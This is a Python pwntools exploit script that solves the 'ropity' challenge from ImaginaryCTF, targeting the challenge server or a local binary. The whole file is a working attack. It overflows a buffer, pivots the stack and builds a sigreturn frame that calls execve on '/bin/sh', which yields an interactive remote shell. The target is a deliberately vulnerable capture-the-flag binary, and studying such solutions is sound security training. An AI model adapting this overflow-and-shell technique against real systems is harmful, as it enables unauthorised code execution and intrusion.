from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './vuln'
HOST = 'ropity.chal.imaginaryctf.org'
PORT =   1337

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

rbp = 0x0040119b

r = start()
if args.D:
	debug(r, [0x115b])

if args.R:
    r.recvuntil(b'\n')
payload = b''
payload += b'a'*8
payload += flat(0x404020, elf.sym.main+12)
r.sendline(payload)

binsh_addr = 0x404030
payload = b''
payload += flat(elf.sym.printfile+12+7, 0xf+8, 0x401149)
payload += b'/bin/sh\x00'
payload += b'2'*8
payload += b'3'*8
payload += b'4'*8
payload += b'5'*8
payload += b'6'*8
payload += b'7'*8
payload += b'8'*8
payload += b'9'*8
payload += b'a'*8
payload += b'b'*8
payload += b'c'*8
payload += p64(binsh_addr)#b'd'*8 # rdi
payload += p64(0)#b'e'*8# rsi
payload += b'f'*8
payload += b'1'*8
payload += p64(0)#b'2'*8# rdx
payload += p64(0x3b)#b'3'*8# rax
payload += b'4'*8
payload += p64(0x404400)#b'5'*8#rsp
payload += p64(0x401198)#b'6'*8#rip
payload += p64(0)
payload += p64(0x33)
payload += p64(0x2b)
r.sendline(payload)

r.interactive()
r.close()

